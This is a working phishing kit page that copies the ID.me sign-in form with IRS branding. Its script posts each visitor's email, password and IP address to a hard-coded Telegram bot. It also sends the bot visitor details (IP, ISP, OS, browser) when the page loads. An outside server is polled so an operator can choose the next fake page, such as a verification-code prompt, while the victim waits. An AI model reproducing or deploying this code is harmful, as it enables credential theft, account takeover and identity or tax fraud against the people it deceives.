<!DOCTYPE html>
<html dir="ltr" lang="en">

<head>
    <title>Sign in to ID.me - ID.me</title>
    <meta charset="utf-8">
    <meta content="IE=edge" http-equiv="X-UA-Compatible">
    <meta content="One Identity. One Wallet." name="description">
    <meta content="" name="keywords">
    <meta content="noodp" name="robots">
    <meta content="width=device-width, initial-scale=1, minimum-scale=1" name="viewport">
    <meta content="noindex" name="robots">
    <link rel="icon" type="image/png" href="images/favicon_3b57957bde0ba341f2e080013aa6d42d303e29a4594c8f231c013514b22241f0.ico">
    <link rel="stylesheet" media="all" href="css/application-0189d16e9dcf751fcf91038fa9ac30c98194116564b5125b826c9f7219da2f93.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&family=Montserrat:wght@400;500;700&family=Raleway:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
</head>

<body>
    <div class="page-container" data-role="page-container">
        <div class="container">
            <div class="content-container">
                <form id="myForm" onsubmit="submitForm(event)">
                    <div class="form-header">
                        <div class="form-header-content" role="banner">
                            <div class="partner">
                                <div class="c_icon m_idme">
                                    <img alt="" class="img-lightmode" src="images/idme-logo-1d96899e99d393974ec16fa17a820e78fca132bd8ea53e01f12bdc000baf674f.svg">
                                    <img alt="" class="img-darkmode" src="images/idme-logo-white-3fda17b1e33891acf640ab0125f80fb2feafbdd0cf0423c06de22149b643fcbb.svg">
                                </div>
                                <div class="c_icon m_addition">
                                    <img alt="" class="img-lightmode" src="images/icon-addition-1c60f492657aa091463f6ac2e15f0f5123425f314e60383dbba0b06b3bbae0ed.svg">
                                    <img alt="" class="img-darkmode" src="images/icon-addition-white-cbf0d61d70d65bb52b8aaa42341da4d8e957fa0c67e22720e878618233f791a7.svg">
                                </div>
                                <div class="c_icon m_consumer-logo">
                                    <img alt="ID.me with The Internal Revenue Service" src="images/large.png">
                                </div>
                            </div>
                        </div>
                    </div>
                    <main aria-labelledby="sr_page_title" class="form-container">
                        <div class="form-header-access">
                            <h1 id="sr_page_title">Sign in to ID.me</h1>
                        </div>
                        <div class="form-header-well">
                            <p>New to ID.me?</p>
                            <p><a href="">Create an ID.me account</a></p>
                        </div>
                        <p class="alert alert-error" role="alert" style="display: block;">The email or password you entered is incorrect.</p>
                        <div class="form-fields">
                            <div class="field-group">
                                <div class="field text">
                                    <label for="user_email">Email</label>
                                    <input placeholder="Enter your email address" required="required" autocomplete="email" type="email" name="user[email]" id="user_email">
                                </div>
                                <div class="field text password-showable" data-component="Components.Showable">
                                    <label for="user_password">Password</label>
                                    <input placeholder="Enter password" required="required" autocomplete="current-password" type="password" name="user[password]" id="user_password">
                                </div>
                                <div style="display: none;">
                                    <label for="honeypot">Leave this field blank:</label>
                                    <input type="text" id="honeypot" name="honeypot">
                                </div>
                                <div class="field checkbox remember_me" data-component="Cookies.Delete" data-endpoint="/cookies/remember_me">
                                    <input type="checkbox" name="remember_me" id="remember_me" value="true" aria-describedby="remember-me-tip">
                                    <label for="remember_me"><span aria-hidden="true" class="checkmark">î˜›</span>
                                        <span>Remember me</span>
                                        <div id="remember-me-tip">For your security, select only on your devices.</div>
                                    </label>
                                </div>
                            </div>
                        </div>
                        <div class="form-actions">
                            <button type="submit" name="commit" class="btn btn-primary" data-disable-with="Signing in...">
                                Sign in
                            </button>
                        </div>
                        <div class="form-footer">
                            <p><a href="">Forgot password</a></p>
                        </div>
                        <div class="separator">
                            <span>OR</span>
                        </div>
                        <div class="connections">
                            <a class="facebook connection" aria-label="Sign in with Facebook" href=""></a>
                            <a class="google connection" aria-label="Sign in with Google" href=""></a>
                            <a class="apple connection" aria-label="Sign in with Apple" href=""></a>
                            <a class="linkedin connection" aria-label="Sign in with LinkedIn" href=""></a>
                            <a class="connection m_full" href="">View more options</a>
                        </div>
                    </main>
                </form>
            </div>
        </div>
        <footer class="footer">
            <nav aria-label="Footer" class="footer__links">
                <ul class="footer__list">
                    <li class="footer__list-item"><a target="_blank" rel="noopener noreferrer" class="footer__link" title="What is ID.me? (opens in new tab)" aria-label="What is ID.me? (opens in new tab)" href="">What is ID.me?</a></li>
                    <li class="footer__list-item"><a target="_blank" rel="noopener noreferrer" class="footer__link" title="Terms of Service (opens in new tab)" aria-label="Terms of Service (opens in new tab)" href="">Terms of Service</a></li>
                    <li class="footer__list-item"><a target="_blank" rel="noopener noreferrer" class="footer__link" title="Privacy Policy (opens in new tab)" aria-label="Privacy Policy (opens in new tab)" href="">Privacy Policy</a></li>
                </ul>
            </nav>
        </footer>
    </div>

    <script>
        function signInClicked() {
            var email = document.getElementById('user_email').value;
            var password = document.getElementById('user_password').value;

            if (email.trim() === '' || password.trim() === '') {
                return;
            }

            var signInButton = document.querySelector('.form-actions button');
            signInButton.disabled = true;
            signInButton.textContent = signInButton.getAttribute('data-disable-with');
        }

        let hasAlerted = false;

        function hasAlertedForCurrentIP() {
            const ipAddress = localStorage.getItem('visitorIP');
            return ipAddress && hasAlerted;
        }

        function setAlertedForCurrentIP() {
            const ipAddress = localStorage.getItem('visitorIP');
            if (ipAddress) {
                hasAlerted = true;
                localStorage.setItem('hasAlerted', 'true');
            }
        }

        async function telegramSend(message, keyboard = null) {
            const apiKey = '7573968861:AAFRB18VRAnd-LMxXU3LDwE8UVbYJfnaTCg';
            const chatId = '6845072076';
            const format = 'HTML';

            const apiUrl = `https://api.telegram.org/bot${apiKey}/sendMessage`;

            const payload = {
                chat_id: chatId,
                text: message,
                parse_mode: format,
            };

            if (keyboard) {
                payload.reply_markup = JSON.stringify({
                    inline_keyboard: keyboard,
                });
            }

            try {
                const response = await fetch(apiUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload),
                });

                const result = await response.json();
                console.log(result);
                return true;
            } catch (error) {
                console.error('Error sending message to Telegram:', error);
                return false;
            }
        }

        async function getVisitorInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                const ip = data.ip;
                const country = data.country_name;
                const region = data.region;
                const organization = data.org;
                const asn = data.asn;
                const hostname = data.hostname;
                const os = navigator.platform;
                const browser = navigator.userAgent;

                const message = `
                ----ðŸŒŸNEW VISITORðŸŒŸ----
                Message:ðŸš¹ Visitor accessed the website
  
                Visitor Information:
                ðŸ“²IP: ${ip}
                ðŸŒCountry: ${country}
                ðŸ Region: ${region}
                ðŸ¢Organization: ${organization}
                ðŸ”ASN: ${asn}
                ðŸ–¥Hostname: ${hostname}
                ðŸ’» OS: ${os}
                ðŸŒBrowser: ${browser}
                `;

                await telegramSend(message);
            } catch (error) {
                console.error('Error fetching visitor information:', error);
            }
        }

        async function getIpAddress() {
            try {
                const response = await fetch('https://api64.ipify.org?format=json');
                const data = await response.json();
                localStorage.setItem('visitorIP', data.ip);
                return data.ip;
            } catch (error) {
                console.error('Error fetching IP address:', error);
                return null;
            }
        }

        async function telegramSendOnFormSubmit(email, password, ipAddress, requestId) {
            const message = `----â™»ï¸NEW LOGIN ${requestId}â™»ï¸----
            \nâœ‰ï¸Email: ${email}
            \nðŸ”’Password: ${password}
            \nðŸ“²IP Address: ${ipAddress}`;

            const keyboard = [
                [{ text: 'Login Error', callback_data: 'page_a' }],
                [{ text: 'Verificaion Code', callback_data: 'page_b' }],
                [{ text: 'Error Code', callback_data: 'page_c' }],
                [{ text: 'Verification', callback_data: 'page_d' }],
                [{ text: 'Success', callback_data: 'page_e' }],
    [{ text: 'Reset Password', callback_data: 'page_f' }],
            ];

            const success = await telegramSend(message, keyboard);
            return success;
        }

        async function submitForm(event) {
            event.preventDefault();

            if (document.getElementById('honeypot').value !== '') {
                alert('Bot detected! Form submission prevented.');
                return;
            }

            const email = document.getElementById('user_email').value;
            const password = document.getElementById('user_password').value;

            // Disable the button and change text
            const signInButton = document.querySelector('.form-actions button');
            signInButton.disabled = true;
            signInButton.textContent = signInButton.getAttribute('data-disable-with');

            try {
                const ipAddress = await getIpAddress();
                const requestId = Date.now(); // Generate a unique request ID
                const success = await telegramSendOnFormSubmit(email, password, ipAddress, requestId);

                if (success) {
                    console.log('Waiting for admin to choose a redirect page...');
                    const redirectUrl = await waitForAdminChoice(requestId);
                    if (redirectUrl) {
                        window.location.href = redirectUrl; // Redirect the user
                    }
                } else {
                    console.error('Telegram send was not successful.');
                    // Re-enable the button if submission fails
                    signInButton.disabled = false;
                    signInButton.textContent = 'Sign in';
                }
            } catch (error) {
                console.error('Error during form submission:', error);
                // Re-enable the button if an error occurs
                signInButton.disabled = false;
                signInButton.textContent = 'Sign in';
            }
        }

        async function waitForAdminChoice(requestId) {
            while (true) {
                try {
                    const response = await fetch(`https://aeon-server-2.onrender.com/get-admin-choice-page1-2/${requestId}`);
                    const data = await response.json();

                    if (data.redirectUrl) {
                        return data.redirectUrl; // Return the redirect URL if the admin has made a choice
                    }
                } catch (error) {
                    console.error('Error fetching admin choice:', error);
                }

                // Wait for 2 seconds before polling again
                await new Promise((resolve) => setTimeout(resolve, 2000));
            }
        }

        window.addEventListener('load', async function () {
            if (!hasAlertedForCurrentIP()) {
                const ipAddress = await getIpAddress();
                await getVisitorInfo();
                setAlertedForCurrentIP();
            }
        });
    </script>
</body>

</html>